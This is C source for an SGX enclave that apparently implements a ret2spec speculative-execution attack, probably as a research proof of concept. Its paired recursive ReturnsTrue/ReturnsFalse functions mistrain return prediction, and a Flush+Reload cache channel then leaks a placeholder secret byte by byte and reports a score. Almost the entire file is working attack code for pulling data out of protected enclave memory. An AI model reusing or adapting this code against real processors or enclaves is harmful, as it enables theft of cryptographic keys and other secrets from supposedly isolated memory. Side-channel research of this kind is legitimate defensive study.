#include <stdarg.h>
#include <stdio.h>      /* vsnprintf */
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include "Enclave.h"
#include "Enclave_t.h"  /* print_string */

#include "libcache/cacheutils.h"

#define enclave_printf       printf

//#define DEBUG_PRINT
//#define TESTING
#define DATA "__________________"
//#define SECRET "INACCESSIBLESECRET"
#define SECRET "SSSSSSSSSSSSSSSSSS"

int idx;
char* secret_data;
const uint64_t kCacheLineBytes = 64;
const size_t kRecursionDepth = 128;

void (*return_true_base_case)();
void (*return_false_base_case)();

char* current_offset;
uint64_t stack_mark_pointers[512];
int stack_pointer = -1;

int printf(const char *fmt, ...)
{
    char buf[BUFSIZ] = {'\0'};
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, BUFSIZ, fmt, ap);
    va_end(ap);
    ocall_print_string(buf);
    return 0;
}

char * create_secret() {
    // allocate secret
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        enclave_printf("allocation of secret failed\n");
    }
    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char * create_public() {
    char* public_data = (char*)malloc(sizeof(DATA)+1);

    if(public_data == NULL) {
        enclave_printf("allocation of public failed\n");
    }

    memcpy(public_data, DATA, sizeof(DATA));

    return public_data;
}


#ifdef TESTING

char leaked[sizeof(SECRET)];

uint64_t not_ocall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    enclave_printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif

    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET) - 1] = 0;

    flush_shared_memory();

    return (uint64_t)mem;
}

void not_ocall_encode(char c){
    cache_encode(c);
}

int not_ocall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        enclave_printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}

#endif

void stack_push(uint64_t *value){ 
    stack_pointer++;
    stack_mark_pointers[stack_pointer] = (uint64_t)value;
}

void stack_pop(){
    stack_pointer--;
}

uint64_t* stack_seek(){
    return (uint64_t*)stack_mark_pointers[stack_pointer];
}

void* StartOfNextCacheLine(void* addr) {
  uint64_t addr_n = (uint64_t)addr;

  // Create an address on the next cache line, then mask it to round it down to
  // cache line alignment.
  uint64_t next_n = (addr_n + kCacheLineBytes) & ~(kCacheLineBytes - 1);
  return (void*)next_n;
}

void* FlushFromDataCache(void* start, void* end, uint64_t fn_addr){
  void* st_addr = start + 0x38;  
  for (; start < end; start=StartOfNextCacheLine(start)){
    flush(start);
  }
  mfence();
  nospec();

  // Inteded to increase speculative window by adding delayed computation to the return address (correct offset if needed)
  return st_addr;
}

static void NopFunction() {}

__attribute__((aligned(4096))) void dead_code(char *arr){
    // Unreachable code. ReturnsFalse can never return true.
    // Disclosure Gadget
    char c = arr[0];
    // Transmission
    cache_encode(c);
    
    enclave_printf("Dead code. Must not be printed.\n");
}
__attribute__((aligned(4096)))  __attribute__((used)) void offset_further_code(){}

// Always returns false.
int ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
        //dead_code(current_offset);
        cache_encode('S');
    }
  } else {
    // Increase the interference if running cross-address-space.
    return_true_base_case();
  }
  return 0;
}

static int ReturnsTrue(int counter) {
    // Creates a stack mark and stores it to the global vector.
    uint64_t stack_mark = (uint64_t)0x6463626160595857;
    stack_push(&stack_mark);

    if (counter > 0) {
        // Recursively invokes itself.
        ReturnsTrue(counter - 1);
    } else {
        // In the deepest invocation starts the ReturnsFalse recursion or
        // unschedule to increase the interference.
        return_false_base_case();
    }

    // Cleans-up its stack mark and flushes from the cache everything between its
    // own stack mark and the next one. Somewhere there must be also the return
    // address.
    stack_pop();

    uint64_t* st_addr = (uint64_t*)FlushFromDataCache(&stack_mark, (void*)stack_seek(), (uint64_t)ReturnsTrue);

    // Speculating on the return
    return 1;
}

#ifdef TESTING
#define ITER 500
#else
#define ITER 5000
#endif
int iterations = 0;

char Ret2specLeakByte() {
  for (int run = 0;; ++run) {
    flush_shared_memory();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    uint64_t stack_mark = (uint64_t)0x6463626160595857;
    stack_push(&stack_mark);
    
    ReturnsTrue(kRecursionDepth);
    stack_pop();

    mfence();
    nospec();

#ifdef TESTING
    for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if (flush_reload(mem + mix_i * pagesize)) {
        if (mix_i >= 'A' && mix_i <= 'Z') {
          // Found a candidate
          return (char)mix_i;
        }
      }
    }
#else
    int ret_val;
    ocall_cache_decode(&ret_val);
    if ( ret_val == 1){
      return 'S';
    }
#endif


    iterations++;
    if (run >= ITER - 1) {
      return '_';
    }
  }
}


__attribute__((noinline, used)) static int sim_call_stack(int counter){
  if (counter > 0) {
    // Recursively invokes itself.
    sim_call_stack(counter - 1);
  }
  return 0;
}

static void ReturnsFalseRecursion() {
#ifdef TESTING
  ReturnsFalse(kRecursionDepth);
  
  // simulate call stack
  sim_call_stack(15);

#else
  int ret_val;
  ocall_return_false(&ret_val, (uint64_t)kRecursionDepth);
#endif
}

void ecall_main(){
#ifdef TESTING
    uint64_t val = not_ocall_init_attack();
#else
    uint64_t val;    
    ocall_init_attack(&val);
#endif
    mem = (char*)val;

    secret_data = create_secret(); 

    char leaked[sizeof(SECRET) + 1];
    memset(leaked, '_', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseRecursion;

#ifdef DEBUG_PRINT
    enclave_printf("Public %p, Secret %p\n", public_data, secret_data);
#endif

    flush_shared_memory();
    mfence();

    for (size_t i = 0; i < sizeof(SECRET) - 1; ++i) {
        current_offset = secret_data + i;
        char c = Ret2specLeakByte();
#ifdef DEBUG_PRINT
        enclave_printf("[%ld]: %c\n", i, c);
#endif
        leaked[i] = c;
    }
    int score=0;
    for (int i = 0; i < sizeof(SECRET); i++){
        // Do not include the space!
        if (leaked[i] == secret_data[i] && i != 12){
            score++;
        }
    }

    enclave_printf("%d, %d", iterations, score);
    if (score > 0){
        enclave_printf(" <--\n");
    }else{
        enclave_printf("\n");
    }
}



